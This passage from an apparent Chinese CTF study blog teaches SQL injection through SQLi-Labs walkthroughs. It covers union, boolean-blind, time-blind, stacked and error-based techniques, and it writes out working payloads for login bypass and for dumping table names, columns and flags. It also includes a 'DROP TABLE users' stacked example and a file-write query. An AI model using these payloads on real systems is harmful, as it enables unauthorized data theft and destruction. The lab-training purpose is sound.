<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
</ul>
<h1 id="Week4-2-SQL-注入"><a href="#Week4-2-SQL-注入" class="headerlink" title="[Week4.2]SQL 注入"></a>[Week4.2]SQL 注入</h1><h2 id="概论-1"><a href="#概论-1" class="headerlink" title="概论"></a>概论</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>SQL 注入</strong>是 CTF web 中最常见的漏洞之一，是攻击者通过输入特殊构造的字符串，篡改后端 SQL 查询语句，从而实现未授权操作的漏洞。</p>
<h3 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h3><ol>
<li>程序未对用户输入做严格过滤，直接将输入拼接到 SQL 语句中。</li>
<li>攻击者利用引号、注释符等 SQL 语法，改变原查询的逻辑（比如绕开登录验证、查询敏感数据）。</li>
<li>后端数据库执行了被篡改的恶意 SQL 语句，返回攻击者需要的结果。</li>
</ol>
<h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p>假设登录功能的后端 SQL 语句是：<code>select * from user where username=&#39;用户输入&#39; and password=&#39;用户输入&#39;</code></p>
<ul>
<li>正常输入：用户名 <code>admin</code>、密码 <code>123</code>，SQL 语句正常执行，验证账号密码。</li>
<li>注入输入：用户名 <strong>admin’ –</strong>、密码任意，拼接后 SQL 变成 <code>select * from user where username=&#39;admin&#39; --&#39; and password=&#39;任意&#39;</code>。</li>
<li>其中 <code>&#39;</code> 闭合前面的引号，<code>--</code> 是 SQL 注释符，后面的内容被忽略，最终直接查询 <code>username=&#39;admin&#39;</code> 的用户，绕开密码验证。</li>
</ul>
<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
<li>读取数据库敏感数据（比如用户账号密码、flag）。</li>
<li>篡改数据库内容（修改密码、插入恶意数据）。</li>
<li>甚至通过高阶注入获取服务器权限。</li>
</ul>
<h3 id="SELECT-函数预备知识"><a href="#SELECT-函数预备知识" class="headerlink" title="SELECT 函数预备知识"></a>SELECT 函数预备知识</h3><p>SELECT 既可以查询列的内容,还可以查询函数的返回值,也可以直接查询并返回字符串.</p>
<p><code>因为 SELECT</code> 核心能力就是 “查询并返回数据”，而数据的来源可以是 <strong>表的列、函数返回值、直接写的常量（字符串、数字等）</strong></p>
<h2 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h2><p>按照查询字段分类，可以分为字符型(当输入的参数为字符串时，称为字符型注入)和数字型(当输入的参数为整形时，称为数字型注入)</p>
<p>按照注入方法，又可以分为 Union 注入，报错注入，布尔注入，时间注入等</p>
<p><strong>注入点</strong>：可以实行注入的地方，通常是一个访问数据库的连接。例如用 post&#x2F;get 提交一个变量的值</p>
<p><strong>实战中我们要推断 get 变量前面的数据库指令，以达成目标</strong></p>
<p><strong>对于基础的 SQL 注入，大致分为找到注入点，判断注入的类型和闭合方式，判断数据库表的列数，用 union 指令</strong></p>
<p><strong>输出同列数的数据库表，找到回显位并获取信息(具体可看文后的解题步骤).</strong></p>
<p>注:有的时候页面只能显示一个内容，第二句的内容是不显示的，</p>
<p>可以把第一句的内容改为数据库不存在的数据，如 id&#x3D;0。</p>
<p><img src="/images/Qt85brpF2oeKbdxjo4WcFAW9n4N.png"></p>
<h3 id="判断数字型-字符型注入"><a href="#判断数字型-字符型注入" class="headerlink" title="判断数字型&#x2F;字符型注入"></a>判断数字型&#x2F;字符型注入</h3><p>数字型和字符型的最本质区别就是变量的值是否被单&#x2F;双引号闭合.</p>
<h4 id="方法一-使用-and-1-1-and-1-2-进行判断"><a href="#方法一-使用-and-1-1-and-1-2-进行判断" class="headerlink" title="方法一 使用 and 1&#x3D;1&#x2F;and 1&#x3D;2 进行判断"></a>方法一 使用 and 1&#x3D;1&#x2F;and 1&#x3D;2 进行判断</h4><p>例如你要 get: ?id&#x3D;1</p>
<p>为了判断输入的 1 是数字型还是字符型，你可以在 1 后面添加 and 1&#x3D;1 和 and 1&#x3D;2</p>
<p>添加 and 1&#x3D;1 时，字符型和数字型都可以执行后续的命令</p>
<p>但是添加 and 1&#x3D;2 时，只有字符型可以执行 get 以后的命令，因为数字型不带引号，将 and 1&#x3D;2 视为本句话内额外的命令，and 1&#x3D;2 返回的是 false，后续的指令将无法执行.</p>
<h4 id="方法二-使用带减号的运算表达式进行判断"><a href="#方法二-使用带减号的运算表达式进行判断" class="headerlink" title="方法二 使用带减号的运算表达式进行判断"></a><strong>方法二 使用带减号的运算表达式进行判断</strong></h4><p>若为数字型，get：?id&#x3D;2-1 会等价于 id&#x3D;1</p>
<p>若为字符型则不会执行 id&#x3D;1 的操作.</p>
<h3 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h3><p>运用<strong>构造闭合</strong>的方法，进行注入类型判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ?</span><br></pre></td></tr></table></figure>

<p>这里的问号可以有多种的闭合方式, <code>$id</code>, <code>&#39;$id&#39;</code>, <code>&quot;$id&quot;</code>, <code>($id)</code>,(“”),(‘’)等。</p>
<p>比如后台为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;$id&quot;</span><br></pre></td></tr></table></figure>

<p>那么我们使传入的 $id &#x3D; ‘1”‘, 那么后台执行则为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;1&quot; &quot;</span><br></pre></td></tr></table></figure>

<p>在这里我们对 1 完成了闭合构造，但是我们闭合了前序导致后续的 <code>&quot;</code> 没有双引号配对，多出来的这个双引号则会导致报错：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>所以我们通常在构造完闭合后去注释掉后面的符号，比如使用 <code>#</code> <code>--</code></p>
<p>上面是白盒下面很直观的版本，但是大多数情况下，<strong>SQL 注入都是黑盒</strong>，我们不知道后台到底是怎么写的，<strong>所以我们需要一些判断的方法或者技巧</strong>。</p>
<h4 id="通过是否报错"><a href="#通过是否报错" class="headerlink" title="通过是否报错"></a><strong>通过是否报错</strong></h4><p>比如，我们使用 <code>1&#39;</code> 进行试探:</p>
<h4 id="通过报错信息"><a href="#通过报错信息" class="headerlink" title="通过报错信息"></a><strong>通过报错信息</strong></h4><blockquote>
<p>注：我们省略了部分语句和相同的报错，实战中只要看表中出现的不同报错就行了。<br><code>SELECT username,password FROM users WHERE id = &quot;1&quot;&quot;;</code>  -&gt; id&#x3D;xx<br><code>You have an error in your SQL syntax; check the manual that  corresponds to your MySQL server version for the right syntax to use  near &#39;1&#39;&#39; at line 1</code><br>-&gt; <code>near &#39;1&#39;&#39; at line 1</code></p>
</blockquote>
<p>这里 near 后的字符自带单引号，要去除掉,去除后就是后台报错的解释</p>
<h3 id="寻找回显位-见-SQLi-Labs-1-解题"><a href="#寻找回显位-见-SQLi-Labs-1-解题" class="headerlink" title="寻找回显位(见 SQLi-Labs-1 解题)"></a>寻找回显位(见 SQLi-Labs-1 解题)</h3><p><strong>下面，将按点展开阐述不同注入方法的注入过程</strong></p>
<h2 id="字符型-UNION-注入"><a href="#字符型-UNION-注入" class="headerlink" title="字符型 UNION 注入"></a>字符型 UNION 注入</h2><p>最终目标:使用 union 注入拿到靶机中数据库里的所有用户名和密码。</p>
<p><em>注:使用不同的注入方法时，基本的步骤还是保持不变</em></p>
<p><strong>找到注入点，判断注入的类型和闭合方式，判断数据库表的列数，用 union 指令</strong></p>
<p><strong>输出同列数的数据库表，找到回显位并获取信息</strong></p>
<h3 id="拿到表名和列名"><a href="#拿到表名和列名" class="headerlink" title="拿到表名和列名"></a>拿到表名和列名</h3><p>想要拿到表名和列名，首先要知道他们存放在哪里</p>
<p>在 mysql 中，有一个名为 information_schema 的数据库，里面包含所有 mysql 数据库的简要信息</p>
<p>而其中包含两个存放表名和列名的数据表.</p>
<p>_tips:<strong>database()</strong>：当前数据库名_</p>
<p><img src="/images/DGHpbtvLGoDprTxK2gqcF7t4nKb.png"></p>
<p>表名集合表中，列名为”table_name”的一列存放着所有的<strong>表名</strong>，而列名为”table_schema”的一列存放着这个表所属的<strong>数据库名</strong></p>
<p><em>注:引用非当前数据库的表名要用 &lt; 数据库名 &gt;.&lt; 表名 &gt; 实现</em></p>
<p><img src="/images/D2PYbxfExoZ6iQxtGwncImPtnOf.png"></p>
<p>这行代码，可以利用数据库 information_schema 中的 tables 表名集合表，来获得 security 数据库中的表名.</p>
<p>若不清楚你需要的数据库名为什么，就使用 table_schema&#x3D;database(),注意不用加引号</p>
<p><em>注:拿到列名，和拿到表名的流程是一样的，这里不再赘述,把表名改成 column 而非 table 即可</em></p>
<p><em>而在表 information_schema.colulumn 中，column_name 代表列名，但还是有 table_name 这一列，代表所在的表名，和 table_schema 这一列，代表所在的数据库名</em></p>
<p><img src="/images/DUZibdAo7oE0vuxv7MycAR58nwb.png"></p>
<p>用 and 连接两个条件，可以既限制数据库名，又限制表名来获得正确的列名</p>
<p>这里为什么知道需要的表名为 users 呢?是因为我们通过查询当前数据库下所有的表名逐个推断出来的，可以查询多个表名，看看哪个表中有用户名和密码这两列,再进入下一个步骤</p>
<h3 id="解决回显位只能显示一个数据的问题"><a href="#解决回显位只能显示一个数据的问题" class="headerlink" title="解决回显位只能显示一个数据的问题"></a>解决回显位只能显示一个数据的问题</h3><p>解决这个问题需要使用 group_concat()函数.</p>
<p>group_concat(&lt; 列名 &gt;)的返回值仍为本列，但若用 group_concat(&lt; 列名 &gt;)代替 &lt; 列名 &gt; 放入 select 函数，select 就会输出 &lt; 数据 1&gt;,&lt; 数据 2&gt;……为一个数据正如:</p>
<p><img src="/images/XxuebGLIuoXkYDxmXuccv7kgn57.png"></p>
<p>而非只输出 emails</p>
<h3 id="查询最终目标"><a href="#查询最终目标" class="headerlink" title="查询最终目标"></a>查询最终目标</h3><p>知道了需要的表名和列名以后，再用 group_concat()来查询最终的目标，在这里是用户名和密码</p>
<p>我们输入</p>
<p><img src="/images/ZearbzMB2oR0h5xgoTGc70ZPncd.png"></p>
<p>用 group_concat 同时输出两列的内容，中间用分隔符~连接，即可获得所有的用户名和密码</p>
<p>这里的 users 和 username,password 都是通过查询 information_schema 数据库中的内容获取的</p>
<p><em>注:这样便说明了 group_concat(多个列名相连接)可以用 SELECT 函数和一列的空间输出两列的内容,</em></p>
<p><em>而非 ORDER BY 几就输出几列.</em></p>
<h3 id="SQLi-Labs-1-解题示例"><a href="#SQLi-Labs-1-解题示例" class="headerlink" title="SQLi-Labs-1 解题示例"></a>SQLi-Labs-1 解题示例</h3><p>SQLi-Labs-1 是一道最基础的 union 题，我们再复习一遍解题的流程</p>
<p><img src="/images/XUyibqmrdojcIOxObOdcylPKn7b.png"></p>
<h4 id="1-查找注入点"><a href="#1-查找注入点" class="headerlink" title="1.查找注入点"></a>1.查找注入点</h4><p><img src="/images/M9anbtKV3o4s1YxEIV5cG9IBnHe.png"></p>
<p>注意到本题提示需要你输入 id，又没有输入的窗口，于是尝试 post id&#x3D;1 和 get id&#x3D;1</p>
<p>发现 get id&#x3D;1 让网页有了回显，这样便发现了这么一个注入点.</p>
<p><img src="/images/HV1abjyhYoi37ixxUcccLqC5nqn.png"></p>
<p><img src="/images/APiXbwAe6oohRcxmztmcwbkYn4W.png"><br><img src="/images/AKJKbG3ypos6K4xan3rcm6z0nmG.png"><br>尝试更换几个数字，发现 login name 和 password 一直在变，说明这是一个数据库表的某两列</p>
<h4 id="2-判断注入类型-字符型-数字型"><a href="#2-判断注入类型-字符型-数字型" class="headerlink" title="2.判断注入类型(字符型&#x2F;数字型)"></a>2.判断注入类型(字符型&#x2F;数字型)</h4><p>这里 get 一个?id&#x3D;3-2,他的回显并不是 id&#x3D;1 的回显,故认为是字符型.</p>
<p><img src="/images/SzGZbDPi4oj0OIxLjsncp0ovnld.png"></p>
<h4 id="3-找到闭合方式"><a href="#3-找到闭合方式" class="headerlink" title="3.找到闭合方式"></a>3.找到闭合方式</h4><p><img src="/images/ZLJjb9TtPo5ksAxKjtlcKf1Unkg.png"></p>
<p>先试了试双引号,发现并没有报错,如果闭合方式是双引号,那他包会报错的,因为你提前闭合了,那就是单引号了,我们可以验证一下: get: ?id&#x3D;’1</p>
<p><img src="/images/HhQRbKyL8o5HaDxmAE3cC33nnKd.png"></p>
<p>先排除一下 near 后和 at 前的第一个单引号，这作为报错的引用号，不是代码里的内容</p>
<p>真正报错的内容是:</p>
<p>1’LIMIT 0,1</p>
<p><em>LIMIT 是限制回显的行，这里是返回 0 到 1 行的数据</em></p>
<p><em>这个我们可以不管，因为在这里真正限制回显的是</em><strong>回显位，而不是 LIMIT</strong></p>
<p>实际上这原本是:</p>
<p>**’****’<strong>1</strong>‘**LIMIT 0,1</p>
<p>黄底的单引号直接空引用视为空了</p>
<p>而代表闭合方式的单引号是红色的</p>
<p>如果我们 get 的是 1,那肯定正常运行了,实际的后半段代码是</p>
<p>‘1’LIMIT 0,1</p>
<p>或者再试试 1’,发现 1’直接被单引号包裹了</p>
<p><img src="/images/S2qybJcijoaLfNxBKhLcJ2g1nsg.png"></p>
<p>也能直接判断闭合方式就是单引号</p>
<h4 id="4-判断查询列数"><a href="#4-判断查询列数" class="headerlink" title="4.判断查询列数"></a>4.判断查询列数</h4><p>我们这里是 UNION 注入,UNION 前后的 SELECT 要求列数是相同的,先看看前面的 SELECT(要你填 id 的 SELECT)查了几列(查了几列和 LIMIT”要查几行”和回显都没有关系,最终回显的东西是看回显位,这里是为了让 UNION 结构正常运行)</p>
<p>我们采用 ORDER BY &lt; 列数 &gt; 调试一下,注意末尾加个–+,+ 代表空格注释掉后面可能有的对于原指令的限制条件，以让 ORDER BY 正常执行</p>
<p><img src="/images/L8meb4D39oBiXMx7bp8cFrLanNc.png"></p>
<p><img src="/images/ObedbqB8hoqRoqxQZ6lcqCEJnOh.png"></p>
<p>这里尝试了一下 ORDER BY 1-4，发现恰好在 3 这里可以执行，说明前面的 SELECT,他查询了三列,我们后面的 UNION 也要是三列</p>
<h4 id="5-找到回显位"><a href="#5-找到回显位" class="headerlink" title="5.找到回显位"></a>5.找到回显位</h4><p>既然 SELECT 他查询了三列,但是 Your Login name 和 Password 他只显示两列的内容，而且只有一个数据(因为列名并没有被 group_concat()包裹)，那不妨看看他会显示 UNION 后的(我们可操控的)哪两列.</p>
<p><img src="/images/Bk24bH0bZof4iIxQreUc8UnPniA.png"></p>
<p>直接输列名 1,2,3 不加 FROM,他应该会直接返回数字 1,2,3;</p>
<p>这里让 id&#x3D;-1,让 UNION 前面的查询无效,避免回显位仍显示 UNION 前正常的内容</p>
<p>发现回显了 2,3,发现 UNION 后,SELECT 的第二个和第三个列是有用的(会产生回显的)</p>
<p>随后我们要查询的列，就放在 SELECT 的第二个或第三个位置</p>
<h4 id="6-查询表名和列名"><a href="#6-查询表名和列名" class="headerlink" title="6.查询表名和列名"></a>6.查询表名和列名</h4><p>下一步按道理是获取全部人的用户名和密码,我们需要找到用户名和密码所在的数据库表和真正的列名，并使用 group_concat()让他们一一回显.</p>
<p>先查询表名,payload:</p>
<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
<p>这里查询的是当前数据库即 database()函数返回的数据库中的所有表名</p>
<p>其作为一个列存放于数据库 information_schema 中的一个表 tables</p>
<p><img src="/images/LLlVbjCCXomHFsxlfS7cVjcvnPb.png"></p>
<p>看到了竟然有一个表叫 flag,那 flag 估计在这个表里，不是在获取所有用户名和密码的时候回显…</p>
<p>那再查询列名,看看表 flag 里面有哪些列,payload:</p>
<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(COLUMN_NAME),3 FROM information_schema.columns WHERE table_schema&#x3D;database() and table_name&#x3D;’flag’ –+</p>
<p>这里查询的是 database()返回的数据中,表’flag’中的全部列名(两个条件用 and 连接,注意 table_name 代表你想查询的列所在的表,加<strong>单引号</strong>表示字符串)</p>
<p><img src="/images/HR1wbYDQTozhCpxXAOwcVOS7nVd.png"></p>
<p>回显就两列,id 和 flag,看看这两列呗</p>
<h4 id="7-得到答案"><a href="#7-得到答案" class="headerlink" title="7.得到答案"></a>7.得到答案</h4><p>payload:?id&#x3D;-1’ UNION SELECT 1,group_concat(FLAG),3 FROM FLAG–+</p>
<p><img src="/images/PNxMbXs3JoH5Bbx072sctFC4nDb.png"></p>
<p>发现表名好像区分大小写(?)</p>
<p>并且发现了 <strong>FROM 一个不存在的表名,好像就能看到 database()返回的数据库名了</strong></p>
<p>修改一下准确的大小写</p>
<p>payload:?id&#x3D;-1’ UNION SELECT 1,group_concat(flag),3 FROM flag–+</p>
<p><img src="/images/DYScbC3PWoxuFKxRX3Jc8og7nwf.png"></p>
<p>那答案就出来了.</p>
<h2 id="数字型-UNION-注入"><a href="#数字型-UNION-注入" class="headerlink" title="数字型 UNION 注入"></a>数字型 UNION 注入</h2><p>数字型注入比字符型更容易,以上一题为例,在 payload: ?id&#x3D;2-1 的时候能输出 id&#x3D;1 时的用户名和密码,就为数字型注入.不用找到闭合方式，直接往下判断查询列数就可以了.</p>
<p>Payload: ?id&#x3D;1 GROUP BY 4 –+ 这样</p>
<p>查询表名的时候:</p>
<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
<p>可以用括号等价于:</p>
<p>?id&#x3D;-1’ UNION SELECT 1,<strong>(<strong>SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()</strong>)</strong>,2 –+</p>
<p>利用红色的 SELECT 他在无 FROM 时遇到不存在的列会直接回显不存在的列名,来让其直接回显 TABLE_NAME 里面的内容</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
<p>在<strong>页面没有报错回显，也不知道数据库具体返回值</strong>的情况下，对数据库中的内容进行猜解，实行盲注。</p>
<p><strong>布尔盲注</strong>则指的是 web 页面只返回 True 真，False 假两种类型。利用页面返回不同，<strong>逐个猜解</strong>数据。</p>
<p>例如我 payload ?id&#x3D;1,页面会响应,输出一行或者若干行,但是不会显示数据库的具体内容</p>
<p>Payload ?id&#x3D;’1,页面不会正常输出,也不会显示报错</p>
<p>这种网页的回显只有真(正常输出)或者假(非正常输出)的题型,则属于<strong>布尔盲注</strong>题型</p>
<h3 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h3><p>ASCII() 返回 ASCII 码,注意如果括号中是字符或者字符串的话,一定要加单引号.</p>
<p>SELECT ASCII(‘A’)</p>
<p>会输出 65</p>
<p>此外,ASCII()函数只会转换括号中字符串的第一个字符的 ASCII</p>
<p>SELECT ASCII(‘AWZ’)</p>
<p>依然会输出 65.</p>
<p>SUBSTR(&lt; 内容 &gt;,&lt; 第 m 个字符 &gt;,&lt; 第 n 个字符 &gt;)</p>
<p>这个函数能够返回内容中从第 m 个字符开始的后 n 个字符(包括第 m 个字符),配合 ASCII(),能够得到一个字符串中特定位置</p>
<p>的字符的 ASCII 值.</p>
<p>例如 ASCII**(<strong>SUBSTR(SELECT DATABASE()),1,1</strong>)**就能得到 DATABASE()中第 1 个(从 1 开始)字符的 ASCII 值</p>
<h3 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h3><p><strong>比较 ASCII 值</strong></p>
<p>和一般的解题步骤一样，找到闭合方式，判断查询列数，都可以通过页面的真假来解决.</p>
<p>但查询表名和列名时，由于他不会回显，我们只能想办法得到查询的表名和列名的 ASCII 值</p>
<p>再翻译回来.</p>
<p>以查询表名(闭合方式为单引号,3 列)为例,正常的 payload 是:</p>
<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
<p>会直接返回 database 数据库下所有的表名</p>
<p>但当页面只会返回命令的真假时,用</p>
<p>?id&#x3D;-1’ AND ASCII**(<strong>SUBSTR((SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()),1,1)</strong>)&gt;&#x3D;100 –+**</p>
<p>判断 database()数据库下所有表名的第一个字符的 ASCII 码能否超过 100(超过则网页正常回显,小于则不回显)</p>
<p>再使用二分法等,判断能否超过 110,90 等等,从而获得所有表名的第一个字符的 ASCII 码</p>
<p>用这个方式,改变 SUBSTR 的参数,获得第二,第三……个字符的 ASCII 码，再进行转码,即可成功查询列名和表名</p>
<p>或者不用 group_concat 包裹也行,因为不会回显,最后再加上个 LIMIT 0,1 也可以获得所有表名的 ASCII 码(表示从第 0 行开始显示 1 行)</p>
<p>?id&#x3D;-1’ AND ASCII**(<strong>SUBSTR((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1),1,1)</strong>)&gt;&#x3D;100 –+**</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>时间盲注</strong>指的是 web 页面只返回一个正常页面，利用页面响应时间不同，逐个猜解数据。</p>
<p>注:前提是数据库会执行命令代码，只是不反馈页面信息</p>
<h3 id="关键函数-1"><a href="#关键函数-1" class="headerlink" title="关键函数"></a>关键函数</h3><p>Sleep()</p>
<p>Sleep(秒数)代表延迟多少秒</p>
<p>if()</p>
<p>if(condition,I,II)</p>
<p>类似三目运算符,如果 condition 为 true,则执行 I 中代码,否则执行 II 中代码</p>
<h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p>如果这个网页连真假值都不会显示了，那么可以用 if 短句配合 Sleep()函数,观察网页响应时间来</p>
<p>判断执行的语句是否为真.</p>
<p><img src="/images/XuaQbDkbWoiaQJxtn5rcPS0dnhg.png"></p>
<p>select 在这里充当命令执行的工具</p>
<p>在判断闭合方式的时候,也可以用 id&#x3D;?? and sleep(3)</p>
<p>判断网页是否等待了 3s 响应,如果响应,则代表代码正常执行了.</p>
<p>获取用户名和密码&#x2F;闭合符判断举例:</p>
<p><img src="/images/OFLxb3NBTopeBQxWMkochN1RnTf.png"></p>
<p><img src="/images/Q5qKbpvEno7JJBxpWpOczStbnZB.png"></p>
<p>上面四条语句哪个可以正常执行则哪个闭合符是正确的.</p>
<p>查询耗时可以在网络处查询.</p>
<p><img src="/images/ALUTbkdx7oSgiax6sLRcrPIrnZ9.png"></p>
<h3 id="关于盲注的补充函数"><a href="#关于盲注的补充函数" class="headerlink" title="关于盲注的补充函数"></a>关于盲注的补充函数</h3><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><p>length(字符串)返回字符串长度</p>
<p>可以用?id&#x3D;1 AND length(database())&#x3D;1&#x2F;2&#x2F;3&#x2F;4</p>
<p>依次输入以爆破出 database()的数据长度</p>
<p>当然,用大于等于&#x2F;小于等于效果更佳.</p>
<h4 id="SUBSTR"><a href="#SUBSTR" class="headerlink" title="SUBSTR()"></a><strong>SUBSTR()</strong></h4><p><code>SUBSTR()</code> 函数还可以用于替换字符串中的某个字符(在只知道 username 的长度,而不知道具体值的时候)：</p>
<p>UPDATE users SET username&#x3D;SUBSTR(username,1,3)||’***’||SUBSTR(username,7) WHERE username&#x3D;’admin’</p>
<p>将管理员账户的用户名中的第 4 到第 6 个字符替换为 <code>***</code></p>
<h4 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h4><p><code>MID()</code> 函数也是用于截取字符串的函数,这点和 SUBSTR()相似。</p>
<p><code>MID(string, start, length)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>

<h4 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT()"></a><code>CONCAT()</code></h4><p><code>CONCAT()</code> 函数用于将多个字符串连接成一个字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>

<p>一定程度上和 GROUP_CONCAT 类似</p>
<p><img src="/images/Rengbs1VuoUCSNx6XIScG56cn7c.png"></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>顾名思义 就是一堆 SQL 语句 (多条) 一起执行方法被称为堆叠注入。</p>
<p>其实讲原理就很容易懂：</p>
<p>在执行 SQL 语句时，如果 SQL 语句中包含多个 SQL 语句，数据库服务器会依次执行这些 SQL 语句，从而导致多次 SQL 注入攻击。通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。</p>
<p>举个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>

<p>执行这个 SQL 语句时，数据库服务器会依次执行这两个 SQL 语句，将会查询到 <code>users</code> 表中的用户名和密码，并且将 <code>users</code> 表删除。</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>即通过报错信息获取数据的方法,用于 UNION 无法正常回显的情况(优先级比盲注更先)</p>
<p>实际上在 UNION 学习中接触到的 GROUP BY&#x2F;ORDER BY+ 数字,用是否报错判断列数,本质</p>
<p>上也是一种报错注入.</p>
<p>FROM 错误的表格得到 &lt; 当前数据库名 &gt;.&lt; 表名 &gt; 不存在,实际上也是一种报错注入的方式获得了当前的数据库名.</p>
<h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue 报错注入"></a>extractvalue 报错注入</h3><p>对于报错注入,我们需要<strong>构造语句，让错误信息中夹杂可以显示数据库内容的查询语句</strong></p>
<p>先来看这个函数的正确用法:</p>
<p><img src="/images/Gz7obxLOtoYpQuxRDZqculI7nlh.png"></p>
<p>这里 doc 是列名,第二个参数是一个路径,这个函数正常情况能够<strong>返回用于查询的字符串,可以作为 SELECT 的一个参数</strong></p>
<p>FROM 和 select 连接的,表示在 xml 表中查询.</p>
<p>我们要做的就是让这个函数报错</p>
<p>这里面 <strong>doc 可以直接输,且输什么都不会报错</strong>,但后面的路径一定要以&#x2F;开头,否则整个函数就会报错了</p>
<p>我们可以用下列语句:</p>
<p><img src="/images/L1C7brwt7og0hvx2iONcEafhnTe.png"></p>
<p>这样报错信息就会<strong>提示错误的路径</strong></p>
<p>因此我们可以在路径中做文章,将 select 语句填写入路径参数,再让整个函数报错,获得 select 命令的执行结果.</p>
<p>我们尝试以下语句:</p>
<p><img src="/images/SV66bukrooQ4kRx48nCc8SQNnnf.png"></p>
<p>获得报错:</p>
<p><img src="/images/NYFfb3iLBoSwymxpxh2ccAw9ngg.png"></p>
<p>即得 database 的返回值是 ctfstu</p>
<p><strong>这样就可以用报错内容输出 SELECT 函数能够输出的任意值了</strong></p>
<p><em>注意: 这里的 0x7e</em>_ 就是 <strong>~</strong> 的 “安全写法”，在 SQL 注入中专门用来做数据分隔，让提取的敏感信息更清晰，同时避免语法报错。相当于 concat(‘~’ select database())_</p>
<p>concat()起拼接作用,将~和 select dabase()的返回值给拼接起来了</p>
<p>当然,这个函数也不一定要跟在 SELECT 后</p>
<p><img src="/images/ObkPbMfcNoUsv7xxayOcrp1Vncg.png"></p>
<p>And 能让这个函数报错,也可行,而且还省略了获取列名这个过程,更为推荐.</p>
<h3 id="解决报错只能显示-32-字符的问题"><a href="#解决报错只能显示-32-字符的问题" class="headerlink" title="解决报错只能显示 32 字符的问题"></a>解决报错只能显示 32 字符的问题</h3><p>substr&#x2F;substring 函数(两个函数等价)</p>
<p>SUBSTR(&lt; 内容 &gt;,&lt; 第 m 个字符 &gt;,&lt; 第 n 个字符 &gt;)</p>
<p>这个函数能够返回内容中从第 m 个字符开始的后 n 个字符(包括第 m 个字符)</p>
<p>例如 SUBSTR((SELECT DATABASE()),1,1)就能返回 DATABASE()中第 1 个(从 1 开始)字符</p>
<p>把 SELECT 的结果用括号括起来,就可以获得特定字符的值了</p>
<p><u>我们再用一个示例来巩固报错注入的知识</u></p>
<p>当然用 SELECT SUBSTR(DATABASE()),1,1 也行,效果是一样的</p>
<h3 id="SQLi-Labs-5-解题示例"><a href="#SQLi-Labs-5-解题示例" class="headerlink" title="SQLi-Labs-5 解题示例"></a>SQLi-Labs-5 解题示例</h3><p><img src="/images/UvYibKrKyoISMDxn4bmcZamenNl.png"></p>
<p>进入到关卡界面,发现根本没有回显位</p>
